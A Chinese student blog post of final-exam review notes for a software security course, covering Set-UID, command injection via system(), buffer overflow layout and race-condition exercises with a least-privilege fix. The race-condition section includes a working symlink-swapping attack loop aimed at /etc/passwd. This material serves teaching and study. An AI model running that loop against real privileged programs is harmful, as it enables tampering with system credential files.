<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>软件安全原理与实践：期末复习 | 皓月星辰</title><meta name="author" content="摘星的辉"><meta name="copyright" content="摘星的辉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Set-UID程序知识内容最关键的地方：如果普通用户（ID &#x3D; 5000）执行一个 Set-UID 程序，真实用户 ID 仍是 5000，而有效用户 ID 则取决于该程序的所有者。特别地，如果该程序的所有者是 root，那么其有效用户 ID 将为 0。而访问控制中使用的是有效用户 ID，所以就可以满足：普通用户实行既定的特权。 权限泄漏本质：没有关闭以root身份打开的文件描述符。在 Unix 中">
<meta property="og:type" content="article">
<meta property="og:title" content="软件安全原理与实践：期末复习">
<meta property="og:url" content="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/">
<meta property="og:site_name" content="皓月星辰">
<meta property="og:description" content="Set-UID程序知识内容最关键的地方：如果普通用户（ID &#x3D; 5000）执行一个 Set-UID 程序，真实用户 ID 仍是 5000，而有效用户 ID 则取决于该程序的所有者。特别地，如果该程序的所有者是 root，那么其有效用户 ID 将为 0。而访问控制中使用的是有效用户 ID，所以就可以满足：普通用户实行既定的特权。 权限泄漏本质：没有关闭以root身份打开的文件描述符。在 Unix 中">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://stellarhui.github.io/img/favicon.jpg">
<meta property="article:published_time" content="2025-12-20T15:27:16.423Z">
<meta property="article:modified_time" content="2025-12-24T15:14:33.883Z">
<meta property="article:author" content="摘星的辉">
<meta property="article:tag" content="科研工作,学习笔记,个人成长">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://stellarhui.github.io/img/favicon.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "软件安全原理与实践：期末复习",
  "url": "https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/",
  "image": "https://stellarhui.github.io/img/favicon.jpg",
  "datePublished": "2025-12-20T15:27:16.423Z",
  "dateModified": "2025-12-24T15:14:33.883Z",
  "author": [
    {
      "@type": "Person",
      "name": "摘星的辉",
      "url": "https://stellarhui.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://stellarhui.github.io/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '软件安全原理与实践：期末复习',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/font.css"><meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/"><i class="fa-fw fas fa-book"></i><span> ZJU课程</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-lightbulb"></i><span> 核心知识</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"><i class="fa-fw fas fa-microchip"></i><span> 计算机体系结构</span></a></li><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><i class="fa-fw fas fa-network-wired"></i><span> 计算机网络</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/%E6%95%B0%E5%AD%A6/"><i class="fa-fw fas fa-square-root-variable"></i><span> 数学</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%9D%82%E9%A1%B9/"><i class="fa-fw fas fa-ellipsis"></i><span> 杂项</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">皓月星辰</span></a><a class="nav-page-title" href="/"><span class="site-name">软件安全原理与实践：期末复习</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/"><i class="fa-fw fas fa-book"></i><span> ZJU课程</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-lightbulb"></i><span> 核心知识</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"><i class="fa-fw fas fa-microchip"></i><span> 计算机体系结构</span></a></li><li><a class="site-page child" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><i class="fa-fw fas fa-network-wired"></i><span> 计算机网络</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/%E6%95%B0%E5%AD%A6/"><i class="fa-fw fas fa-square-root-variable"></i><span> 数学</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E6%9D%82%E9%A1%B9/"><i class="fa-fw fas fa-ellipsis"></i><span> 杂项</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">软件安全原理与实践：期末复习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-20T15:27:16.423Z" title="发表于 2025-12-20 23:27:16">2025-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-24T15:14:33.883Z" title="更新于 2025-12-24 23:14:33">2025-12-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ZJU%E8%AF%BE%E7%A8%8B/">ZJU课程</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Set-UID程序"><a href="#Set-UID程序" class="headerlink" title="Set-UID程序"></a>Set-UID程序</h2><h3 id="知识内容"><a href="#知识内容" class="headerlink" title="知识内容"></a>知识内容</h3><p>最关键的地方：如果普通用户（ID = 5000）执行一个 <strong>Set-UID 程序</strong>，<strong>真实用户 ID 仍是 5000，而有效用户 ID 则取决于该程序的所有者。<strong>特别地，如果该程序的所有者是 root，那么其有效用户 ID 将为 0。而</strong>访问控制</strong>中使用的是有效用户 ID，所以就可以满足：<strong>普通用户实行既定的特权。</strong></p>
<h4 id="权限泄漏"><a href="#权限泄漏" class="headerlink" title="权限泄漏"></a>权限泄漏</h4><p>本质：<strong>没有关闭以root身份打开的文件描述符</strong>。在 Unix 中，文件权限检查是在打开文件（open）时进行的。一旦文件被打开得到文件描述符（File Descriptor, FD），后续的读写操作不再检查权限，只检查 FD 是否有效。</p>
<h4 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h4><p>一些函数调用可能会产生风险：</p>
<ul>
<li><code>system(command)</code> 是通过调用 <code>"/bin/sh -c command"</code> 命令来执行 <code>command</code> 的，这意味着如果输入中包含 shell 元字符（如 <code>;, |, &amp;&amp;, &gt;, $</code>），会导致 <strong>命令注入 (Command Injection)</strong>。</li>
</ul>
<p>更安全的版本：</p>
<ul>
<li><code>execve()</code> 函数接受三个参数：(1) 运行的指令，(2) 指令所用到的参数，(3) 传入新程序的环境变量。它直接执行程序，并将参数作为字符串数组传递，无风险。</li>
</ul>
<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p><strong>问题</strong>：试图通过以下命令将 prog 变为 root 拥有的 Set-UID 程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chown</span> root prog</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 prog</span></span><br></pre></td></tr></table></figure>

<p>这能达到目的吗？</p>
<blockquote>
<p>不能。出于安全考虑，当一个文件的所有者（Owner）被改变时（使用 chown），操作系统会<strong>自动清除</strong> Set-UID 位。所以应当先<code>sudo chmod 4755 prog</code>，再<code>sudo chown root prog</code>。</p>
</blockquote>
<h2 id="通过环境变量实现攻击"><a href="#通过环境变量实现攻击" class="headerlink" title="通过环境变量实现攻击"></a>通过环境变量实现攻击</h2><h2 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h2><h3 id="知识内容-1"><a href="#知识内容-1" class="headerlink" title="知识内容"></a>知识内容</h3><p><strong>函数栈帧布局图</strong>：</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/function_stack_layout_chinese.png"></p>
<blockquote>
<p>缓冲区溢出图示：</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/buffer_overflow_chinese.png"></p>
</blockquote>
<p><strong>程序的内存布局</strong>：</p>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/mem_layout_chinese.png"></p>
<p>其中：</p>
<ul>
<li>数据段（Data segment）：存放<strong>由程序员初始化的静态/全局变量</strong>。 例如，<code>static int a = 3</code> 定义的变量<code>a</code>将会存储在数据段中。</li>
<li>BSS段（BSS segment）：存放<strong>未初始化的静态/全局变量</strong>。操作系统将会<strong>用0填充这个段</strong>， 因此所有未初始化的变量都会被初始化为0。例如，<code>static int b</code>所定义的静态变量<code>b</code> 将保存在BSS段中，并且被初始化为0。</li>
</ul>
<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p><strong>问题：</strong> Buffer 在 <code>0xAABB0010</code>，RetAddr 在 <code>0xAABB0050</code>。构造攻击字符串。返回地址字段能使用的最小值是多少？</p>
<blockquote>
<p>？</p>
</blockquote>
<p>（注：那个指针link的题目应该不需要掌握）</p>
<h2 id="竞态条件攻击"><a href="#竞态条件攻击" class="headerlink" title="竞态条件攻击"></a>竞态条件攻击</h2><h3 id="知识内容-2"><a href="#知识内容-2" class="headerlink" title="知识内容"></a>知识内容</h3><h4 id="文件相关函数"><a href="#文件相关函数" class="headerlink" title="文件相关函数"></a>文件相关函数</h4><ul>
<li><code>access(path, mode)</code> 的检查机制：检查文件系统权限位（rwx），看 <strong>RUID (Real User ID，真实用户ID)</strong> 是否满足 mode 参数的要求。返回<strong>0</strong>：表示<strong>允许</strong>（检查通过）。返回**-1**：表示<strong>拒绝</strong>（没有权限）。</li>
<li><code>open(path, flags)</code> 的检查机制：它检查 <strong>EUID</strong> 是否有权限打开该文件。成功：返回文件描述符（一个正整数）。失败：返回 -1。</li>
</ul>
<blockquote>
<p>注：</p>
<ul>
<li><p><strong>修改文件内容</strong>：需要<strong>文件本身</strong>的写权限（w）。</p>
</li>
<li><p><strong>删除、重命名、替换文件</strong>（比如把它删了变成链接）：需要<strong>文件所在目录</strong>的写权限（w）。</p>
</li>
</ul>
</blockquote>
<h4 id="粘滞-sticky-符号链接保护"><a href="#粘滞-sticky-符号链接保护" class="headerlink" title="粘滞 (sticky) 符号链接保护"></a>粘滞 (sticky) 符号链接保护</h4><p>当<code>fs.protected_symlinks=1</code>时，<strong>在全局可写的粘滞目录中</strong>，符号链接只能在以下情况被跟随：（1）<strong>符号链接所有者 == 当前进程eUID</strong> 或（2）<strong>符号链接所有者 == 目录所有者</strong></p>
<blockquote>
<p>符号链接“跟随”指的是：当程序访问一个符号链接时，操作系统<strong>解析</strong>该链接指向的<strong>实际目标文件</strong>，而不是操作链接文件本身。</p>
</blockquote>
<p>这就实现了保护，因为<strong>跟随者</strong> (Follower / eUID)是root，而<strong>符号链接所有者</strong> (Symlink Owner)是attacker，二者不相等，导致攻击失败。</p>
<blockquote>
<p>注意：<code>access("/tmp/XYZ", O_RDWR)</code>使用<strong>real user id</strong>来检查权限！</p>
</blockquote>
<h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><p>基础攻击方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">{</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">     unlink(<span class="string">"/tmp/XYZ"</span>);  <span class="comment">// 删除已有链接                     </span></span><br><span class="line">     symlink(<span class="string">"/dev/null"</span>, <span class="string">"/tmp/XYZ"</span>);   </span><br><span class="line">       <span class="comment">// 创建新的链接：让/tmp/XYZ文件的内容是（指向）/dev/null文件的路径</span></span><br><span class="line">     usleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">     unlink(<span class="string">"/tmp/XYZ"</span>);                       </span><br><span class="line">     symlink(<span class="string">"/etc/passwd"</span>, <span class="string">"/tmp/XYZ"</span>);       </span><br><span class="line">     usleep(<span class="number">1000</span>);</span><br><span class="line">   }</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><p><strong>问题</strong>：关于是否存在race condition problem的判断。</p>
<p>（1）如果使用自定义的 <code>faccess(fd, mode)</code>（基于<strong>文件描述符</strong>检查权限），下面的程序有竞争条件吗？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> f = open(<span class="string">"/tmp/x"</span>, O_WRITE);</span><br><span class="line"><span class="keyword">if</span> (!faccess(f, W_OK)) {</span><br><span class="line">	write_to_file(f)</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">	close(f);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>没有</strong>竞争条件漏洞。竞争条件的根源在于“检查的对象”和“使用的对象”不一致（因为文件名到文件实体/inode的映射可能通过<strong>软链接</strong>在中间改变）。但是在此代码中，<code>open</code> 先执行，获得文件描述符 <code>f</code>。此时，<strong>文件实体/inode已经被锁定在 <code>f</code> 中</strong>。随后 <code>faccess(f)</code> 检查的是<strong>同一个</strong>文件描述符 <code>f</code> 所对应的权限（不再受”/tmp/x”这个文件名内容的影响）。<strong>检查和使用的一致性得到了保证</strong>。</p>
</blockquote>
<p>（2）小测题。</p>
<p>（3）下面的程序有竞争条件吗？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">    <span class="type">uid_t</span> real_uid;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="comment">// /tmp/XYZ指向/etc/shadow</span></span><br><span class="line">    fp = fopen(<span class="string">"/tmp/XYZ"</span>, <span class="string">"a+"</span>);</span><br><span class="line">    <span class="comment">// /tmp/XYZ指向/dev/null</span></span><br><span class="line">    stat(<span class="string">"/tmp/XYZ"</span>, &amp;statbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The file owner’s user ID: %d\n"</span>, statbuf.st_uid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The process’s real user ID: %d\n"</span>, getuid());</span><br><span class="line">    <span class="comment">// Check whether the file belongs to the user</span></span><br><span class="line">    <span class="keyword">if</span> (statbuf.st_uid == getuid()) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IDs match, continue to write to the file.\n"</span>);</span><br><span class="line">    <span class="comment">// write to the file ...</span></span><br><span class="line">    <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IDs do not match, exit.\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>（4）如果改成这样呢：<code>fp = fopen("/tmp/XYZ", "a+"); fstat(fileno(fp), &amp;statbuf);</code></p>
<blockquote>
<p>这样就没有了。注意 <code>fstat</code> 检查的是<strong>由文件描述符（<code>fileno(fp)</code>）引用的文件的元数据</strong>，而不是文件路径。</p>
</blockquote>
<p><strong>问题</strong>：race condition 次数判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat1</span>, <span class="title">stat2</span>;</span></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line">    <span class="comment">// 攻击前先把/tmp/XYZ指向/etc/passwd</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, O_RDWR)) {</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="comment">// 第1次迅速切换</span></span><br><span class="line"><span class="keyword">else</span> fd1 = open(<span class="string">"/tmp/XYZ"</span>, O_RDWR);</span><br><span class="line">    <span class="comment">// 第2次迅速切换</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, O_RDWR)) {</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="comment">// 第3次迅速切换</span></span><br><span class="line"><span class="keyword">else</span> fd2 = open(<span class="string">"/tmp/XYZ"</span>, O_RDWR);</span><br><span class="line"><span class="comment">// The program then checks whether fd1 and fd2 refer to the same file, if so, the program will write to fd1 (or fd2). Otherwise, the program will do nothing and exit.</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一共3次。</p>
</blockquote>
<p><strong>问题：</strong> 使用最小权限原则 (Least Privilege) 修复代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seteuid(getuid());  <span class="comment">// 权限降级</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, W_OK) == ACCESS_ALLOWED) {</span><br><span class="line">    f = open(<span class="string">"/tmp/XYZ"</span>, O_WRITE);</span><br><span class="line">    write_to_file(f);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="熔断攻击"><a href="#熔断攻击" class="headerlink" title="熔断攻击"></a>熔断攻击</h2><p>感觉不太会考，略去。</p>
